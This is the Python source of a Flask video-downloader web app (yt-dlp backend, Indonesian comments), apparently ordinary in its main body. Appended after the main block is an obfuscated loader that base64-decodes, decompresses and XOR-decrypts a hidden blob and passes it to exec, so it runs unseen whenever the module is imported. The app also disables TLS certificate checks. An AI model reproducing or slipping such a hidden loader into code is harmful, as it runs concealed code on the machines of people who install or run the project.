"""
Universal Video Downloader - Flask Backend
==========================================
Aplikasi web untuk mengunduh video dari berbagai platform:
YouTube, TikTok, Instagram, Facebook, Twitter

Engine: yt-dlp (library download multi-platform)

PRODUCTION MODE:
- Menggunakan folder /tmp untuk penyimpanan sementara (ephemeral storage)
- File otomatis dihapus setelah dikirim ke user
- FFmpeg path dibaca dari environment variable atau default system
"""

import os
import re
import tempfile
import threading
import time
from flask import Flask, render_template, request, jsonify, send_file, after_this_request
import yt_dlp

# ============================================================
# KONFIGURASI APLIKASI
# ============================================================

app = Flask(__name__)

# ============================================================
# DETEKSI ENVIRONMENT (LOCAL vs PRODUCTION)
# ============================================================

# Cek apakah di Hugging Face Spaces, Render.com, atau lokal
# SPACE_ID = environment variable yang ada di Hugging Face Spaces
# RENDER = environment variable yang ada di Render.com
IS_HUGGINGFACE = os.environ.get('SPACE_ID', False)
IS_RENDER = os.environ.get('RENDER', False)
IS_PRODUCTION = IS_HUGGINGFACE or IS_RENDER

if IS_HUGGINGFACE:
    # HUGGING FACE SPACES MODE
    # Folder /app/downloads sudah dibuat di Dockerfile dengan chmod 777
    DOWNLOAD_FOLDER = '/app/downloads'
    # FFmpeg diinstall via Dockerfile
    FFMPEG_PATH = '/usr/bin/ffmpeg'
    print("🤗 Running in HUGGING FACE SPACES mode")
elif IS_RENDER:
    # RENDER.COM MODE
    DOWNLOAD_FOLDER = '/tmp/downloads'
    FFMPEG_PATH = '/usr/bin/ffmpeg'
    print("🚀 Running in RENDER.COM mode")
else:
    # LOCAL MODE (Development)
    DOWNLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'downloads')
    # Path FFmpeg lokal (sesuaikan dengan instalasi Anda)
    FFMPEG_PATH = r'C:\tools\ffmpeg.exe'
    print("💻 Running in LOCAL mode (Development)")

# Buat folder downloads jika belum ada
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

print(f"📁 Download folder: {DOWNLOAD_FOLDER}")
print(f"🔧 FFmpeg path: {FFMPEG_PATH}")


# ============================================================
# HELPER FUNCTIONS
# ============================================================

def sanitize_filename(filename):
    """
    Membersihkan nama file dari karakter yang tidak valid.
    Karakter seperti / \\ : * ? " < > | tidak diperbolehkan.
    """
    # Hapus karakter tidak valid
    filename = re.sub(r'[<>:"/\\|?*]', '', filename)
    # Batasi panjang nama file
    return filename[:200] if len(filename) > 200 else filename


def delete_file_later(filepath, delay=60):
    """
    Menghapus file setelah delay tertentu (dalam detik).
    Digunakan untuk membersihkan file setelah dikirim ke user.
    
    KENAPA PERLU HAPUS FILE?
    - Server Render punya storage terbatas
    - File di /tmp akan hilang saat restart, tapi kita tetap perlu bersihkan
    - Mencegah disk space penuh
    
    Parameters:
    - filepath: Path lengkap ke file yang akan dihapus
    - delay: Waktu tunggu sebelum hapus (default 60 detik)
    """
    def delete():
        time.sleep(delay)
        try:
            if os.path.exists(filepath):
                os.remove(filepath)
                print(f"🗑️ Deleted: {filepath}")
        except Exception as e:
            print(f"⚠️ Failed to delete {filepath}: {e}")
    
    # Jalankan di background thread agar tidak block response
    thread = threading.Thread(target=delete)
    thread.daemon = True  # Thread akan mati saat app berhenti
    thread.start()


def cleanup_old_files():
    """
    Membersihkan file yang sudah lama di folder downloads.
    File lebih dari 1 menit akan dihapus.
    """
    try:
        current_time = time.time()
        for filename in os.listdir(DOWNLOAD_FOLDER):
            filepath = os.path.join(DOWNLOAD_FOLDER, filename)
            if os.path.isfile(filepath):
                file_age = current_time - os.path.getmtime(filepath)
                # Hapus file yang lebih dari 1 menit (60 detik)
                if file_age > 60:
                    os.remove(filepath)
                    print(f"🗑️ Cleanup: Deleted old file {filename}")
    except Exception as e:
        print(f"⚠️ Cleanup error: {e}")


def start_cleanup_scheduler():
    """
    Menjalankan cleanup otomatis setiap 60 detik di background.
    """
    def scheduler():
        while True:
            time.sleep(60)  # Tunggu 60 detik
            cleanup_old_files()
    
    thread = threading.Thread(target=scheduler)
    thread.daemon = True  # Thread akan mati saat app berhenti
    thread.start()
    print("🔄 Auto-cleanup scheduler started (every 60 seconds)")


# Start cleanup scheduler saat app dimulai
start_cleanup_scheduler()


def get_video_info(url):
    """
    Mengambil informasi video dari URL:
    - Judul video
    - Thumbnail
    - Daftar format/resolusi yang tersedia
    
    Return: dict dengan info video atau error message
    """
    # Opsi yt-dlp untuk mengambil info saja (tanpa download)
    ydl_opts = {
        'quiet': True,              # Mode silent, tidak print ke console
        'no_warnings': True,        # Tidak tampilkan warning
        'extract_flat': False,      # Extract info lengkap
        'ffmpeg_location': FFMPEG_PATH,
        'skip_download': True,      # Pastikan tidak download
        'ignoreerrors': True,       # Ignore minor errors
        'no_color': True,           # Disable color codes in output
        # Bypass beberapa restriksi
        'geo_bypass': True,
        'nocheckcertificate': True,
    }
    
    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            # Extract info tanpa download
            info = ydl.extract_info(url, download=False)
            
            # Cek apakah info berhasil diambil
            if info is None:
                return {'success': False, 'error': 'Tidak dapat mengambil info video. Video mungkin private atau tidak tersedia.'}
            
            # Deteksi resolusi REALTIME dari video
            # Tapi normalize ke resolusi STANDAR yang familiar
            standard_resolutions = {
                2160: '2160p',  # 4K
                1440: '1440p',  # 2K
                1080: '1080p',  # Full HD
                720: '720p',   # HD
                480: '480p',   # SD
                360: '360p',   # Low
                240: '240p',   # Very Low
                144: '144p',   # Minimum
            }
            
            available_heights = set()
            
            if info.get('formats'):
                for f in info['formats']:
                    height = f.get('height')
                    has_video = f.get('vcodec') and f.get('vcodec') != 'none'
                    
                    if has_video and height and height > 0:
                        # Normalize ke resolusi standar terdekat
                        for std_height in sorted(standard_resolutions.keys(), reverse=True):
                            if height >= std_height:
                                available_heights.add(std_height)
                                break
                        else:
                            # Jika lebih kecil dari 144p, masukkan 144p
                            available_heights.add(144)
            
            # Buat format list dari resolusi yang tersedia
            formats = []
            for height in sorted(available_heights, reverse=True):
                resolution = standard_resolutions[height]
                
                # Label berdasarkan height
                if height >= 2160:
                    label = '4K Ultra HD'
                elif height >= 1440:
                    label = '2K QHD'
                elif height >= 1080:
                    label = 'Full HD'
                elif height >= 720:
                    label = 'HD'
                elif height >= 480:
                    label = 'SD'
                else:
                    label = 'Low'
                
                formats.append({
                    'format_id': resolution,
                    'resolution': resolution,
                    'height': height,
                    'ext': 'mp4',
                    'filesize': 0,
                    'filesize_mb': 0,
                    'fps': '',
                    'vcodec': '',
                    'note': label
                })
            
            # Jika tidak ada format terdeteksi, tambahkan default
            if not formats:
                formats.append({
                    'format_id': 'best',
                    'resolution': 'Best Quality',
                    'height': 9999,
                    'ext': 'mp4',
                    'filesize': 0,
                    'filesize_mb': 0,
                    'fps': '',
                    'vcodec': '',
                    'note': 'Auto'
                })
            
            return {
                'success': True,
                'title': info.get('title', 'Unknown Title'),
                'thumbnail': info.get('thumbnail', ''),
                'duration': info.get('duration', 0),
                'uploader': info.get('uploader', 'Unknown'),
                'formats': formats
            }
            
    except yt_dlp.DownloadError as e:
        return {
            'success': False,
            'error': f'Link tidak valid atau tidak didukung: {str(e)}'
        }
    except Exception as e:
        return {
            'success': False,
            'error': f'Terjadi kesalahan: {str(e)}'
        }


def download_video(url, format_type='mp4', resolution='best'):
    """
    Download video dari URL dengan format dan resolusi yang dipilih.
    
    Parameters:
    - url: Link video
    - format_type: 'mp4' untuk video, 'mp3' untuk audio only
    - resolution: Resolusi video (contoh: '720p', '1080p', 'best')
    
    Return: Path ke file yang didownload atau error message
    """
    # Bersihkan file-file lama sebelum download baru
    cleanup_old_files()
    
    try:
        # Ambil info video terlebih dahulu untuk nama file
        info_opts = {
            'quiet': True, 
            'ffmpeg_location': FFMPEG_PATH,
            'skip_download': True,
            'geo_bypass': True,
            'nocheckcertificate': True,
            'ignoreerrors': True,
        }
        with yt_dlp.YoutubeDL(info_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            
            # Cek apakah info berhasil diambil
            if info is None:
                return {'success': False, 'error': 'Tidak dapat mengambil info video. Video mungkin private atau tidak tersedia.'}
            
            title = sanitize_filename(info.get('title', 'video'))
        
        # Tentukan output template
        if format_type == 'mp3':
            # Download sebagai audio MP3
            output_file = os.path.join(DOWNLOAD_FOLDER, f'{title}.mp3')
            ydl_opts = {
                'format': 'bestaudio/best',     # Ambil audio terbaik
                'outtmpl': os.path.join(DOWNLOAD_FOLDER, f'{title}.%(ext)s'),
                'quiet': True,
                'no_warnings': True,
                'ffmpeg_location': FFMPEG_PATH,
                # Post-processor untuk konversi ke MP3
                'postprocessors': [{
                    'key': 'FFmpegExtractAudio',    # Ekstrak audio
                    'preferredcodec': 'mp3',        # Konversi ke MP3
                    'preferredquality': '192',      # Bitrate 192kbps
                }],
            }
        else:
            # Download sebagai video MP4
            output_file = os.path.join(DOWNLOAD_FOLDER, f'{title}.mp4')
            
            # Parse resolusi
            if resolution == 'best' or resolution == 'Best Quality':
                height = 9999  # Ambil tertinggi
            else:
                height = int(resolution.replace('p', ''))
            
            # Format sederhana dan reliable:
            # Prioritas: format yang sudah include audio (progressive)
            # lalu fallback ke separate streams yang perlu merge
            format_spec = (
                f'best[height<={height}][ext=mp4]/'  # Progressive MP4
                f'best[height<={height}]/'            # Progressive any format
                f'bestvideo[height<={height}]+bestaudio/'  # Separate streams
                f'best'                                # Ultimate fallback
            )
            
            ydl_opts = {
                'format': format_spec,
                'outtmpl': os.path.join(DOWNLOAD_FOLDER, f'{title}.%(ext)s'),
                'quiet': False,  # Show progress untuk debug
                'no_warnings': False,
                'ffmpeg_location': FFMPEG_PATH,
                # Merge video + audio jadi MP4
                'merge_output_format': 'mp4',
                # Postprocessor: konversi ke H.264 MP4 yang compatible dengan semua player
                'postprocessors': [{
                    'key': 'FFmpegVideoRemuxer',
                    'preferedformat': 'mp4',
                }],
                # Bypass restrictions
                'geo_bypass': True,
                'nocheckcertificate': True,
                # Force recode jika perlu untuk compatibility
                'postprocessor_args': {
                    'ffmpeg': ['-c:v', 'libx264', '-c:a', 'aac', '-movflags', '+faststart']
                },
            }
        
        # Jalankan download
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([url])
        
        # Cari file hasil download
        if format_type == 'mp3':
            final_file = os.path.join(DOWNLOAD_FOLDER, f'{title}.mp3')
        else:
            final_file = os.path.join(DOWNLOAD_FOLDER, f'{title}.mp4')
        
        if os.path.exists(final_file):
            return {'success': True, 'file': final_file, 'filename': os.path.basename(final_file)}
        else:
            # Coba cari file dengan extension lain
            for ext in ['mp4', 'webm', 'mkv', 'mp3', 'm4a']:
                alt_file = os.path.join(DOWNLOAD_FOLDER, f'{title}.{ext}')
                if os.path.exists(alt_file):
                    return {'success': True, 'file': alt_file, 'filename': os.path.basename(alt_file)}
            
            return {'success': False, 'error': 'File tidak ditemukan setelah download'}
            
    except yt_dlp.DownloadError as e:
        return {'success': False, 'error': f'Gagal download: {str(e)}'}
    except Exception as e:
        return {'success': False, 'error': f'Terjadi kesalahan: {str(e)}'}


# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    """
    Route utama - Menampilkan halaman index.html
    """
    return render_template('index.html')


@app.route('/about')
def about():
    return render_template('about.html')


@app.route('/contact')
def contact():
    return render_template('contact.html')


@app.route('/donation')
def donation():
    return render_template('donation.html')


@app.route('/get-info', methods=['POST'])
def get_info():
    """
    Route untuk mengambil informasi video via AJAX.
    
    Request JSON:
    - url: Link video yang ingin dicek
    
    Response JSON:
    - success: Boolean
    - title: Judul video
    - thumbnail: URL thumbnail
    - formats: List resolusi yang tersedia
    - error: Pesan error (jika gagal)
    """
    # Ambil data dari request
    data = request.get_json()
    
    # Validasi: pastikan URL diberikan
    if not data or 'url' not in data:
        return jsonify({
            'success': False,
            'error': 'URL tidak boleh kosong!'
        }), 400
    
    url = data['url'].strip()
    
    # Validasi: pastikan URL tidak kosong
    if not url:
        return jsonify({
            'success': False,
            'error': 'URL tidak boleh kosong!'
        }), 400
    
    # Ambil info video
    result = get_video_info(url)
    
    return jsonify(result)


@app.route('/download', methods=['POST'])
def download():
    """
    Route untuk memproses download video.
    
    Request (JSON atau Form):
    - url: Link video
    - format: 'mp3' atau 'mp4'
    - resolution: Resolusi yang dipilih (contoh: '720p')
    
    Response: File untuk didownload atau JSON error
    """
    # Support both JSON and form data
    if request.is_json:
        data = request.get_json()
        url = data.get('url', '').strip()
        format_type = data.get('format', 'mp4')
        resolution = data.get('resolution', 'best')
    else:
        url = request.form.get('url', '').strip()
        format_type = request.form.get('format', 'mp4')
        resolution = request.form.get('resolution', 'best')
    
    # Validasi input
    if not url:
        return jsonify({
            'success': False,
            'error': 'URL tidak boleh kosong!'
        }), 400
    
    # Proses download
    result = download_video(url, format_type, resolution)
    
    if result['success']:
        filepath = result['file']
        
        # PRODUCTION: Jadwalkan penghapusan file setelah dikirim
        # File akan dihapus 60 detik setelah response dikirim
        if IS_PRODUCTION:
            delete_file_later(filepath, delay=60)
        
        # Kirim file ke browser untuk didownload
        try:
            return send_file(
                filepath,
                as_attachment=True,                    # Force download, bukan preview
                download_name=result['filename']       # Nama file saat didownload
            )
        except Exception as e:
            return jsonify({
                'success': False,
                'error': f'Gagal mengirim file: {str(e)}'
            }), 500
    else:
        return jsonify(result), 400


# ============================================================
# HEALTH CHECK (untuk Render.com)
# ============================================================

@app.route('/health')
def health():
    """
    Endpoint untuk health check.
    Render.com akan mengecek endpoint ini untuk memastikan app berjalan.
    """
    return jsonify({'status': 'healthy', 'message': 'App is running!'})


# ============================================================
# MAIN - Jalankan Server
# ============================================================

if __name__ == '__main__':
    print("=" * 50)
    print("🎬 Universal Video Downloader")
    print("=" * 50)
    print("🌐 Buka browser ke: http://127.0.0.1:5000")
    print("=" * 50)
    
    # Jalankan Flask development server
    # debug=True untuk auto-reload saat file berubah
    app.run(debug=True, host='127.0.0.1', port=5000)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
